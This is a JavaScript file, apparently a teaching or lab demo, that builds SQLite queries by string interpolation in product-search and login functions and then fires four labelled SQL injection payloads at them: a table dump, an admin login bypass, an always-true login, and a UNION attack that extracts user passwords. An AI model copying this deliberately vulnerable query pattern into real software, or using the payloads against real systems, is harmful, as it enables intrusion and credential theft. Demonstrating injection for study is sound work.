const { DatabaseSync } = require('node:sqlite');
const db = new DatabaseSync('nyondo_stock.db');

function searchProduct(name) {
      const query = `SELECT id, name, cost_price, sell_price, stock FROM products WHERE name LIKE '%${name}%'`;
  console.log(`\n  [QUERY] ${query}`);
  try {
    const rows = db.prepare(query).all();
    console.log(`  [ROWS RETURNED] ${rows.length}`);
    rows.forEach(r => {
      const cost = typeof r.cost_price === 'number' ? r.cost_price.toLocaleString() : r.cost_price;
      const sell = typeof r.sell_price === 'number' ? r.sell_price.toLocaleString() : r.sell_price;
      console.log(`    -> ${String(r.name).padEnd(22)} cost=${String(cost).padStart(8)}  sell=${String(sell).padStart(8)}`);
    });
    return rows;
  } catch (err) {
    console.log(`  [DB ERROR] ${err.message}`);
    return [];
  }
}

function login(username, password) {
      const query = `SELECT id, username, role FROM users WHERE username='${username}' AND password='${password}'`;
  console.log(`\n  [QUERY] ${query}`);
  try {
    const row = db.prepare(query).get();
    if (row) {
      console.log(`  [LOGIN SUCCESS] Logged in as: ${row.username} | role: ${row.role}`);
    } else {
      console.log('  [LOGIN FAILED] No user found.');
    }
    return row;
  } catch (err) {
    console.log(`  [DB ERROR] ${err.message}`);
    return null;
  }
}

// // attack 1: Dump all products
 searchProduct("'OR 1=1--");

// // attack 2: login bypass with no password
  login("admin'--", "anything");


// // attack 3: always true login
  login("'OR '1'='1", "'OR '1' ='1");


// // attack 4: union attack
  searchProduct("' UNION SELECT id, username, password, role, 0 FROM users--");

 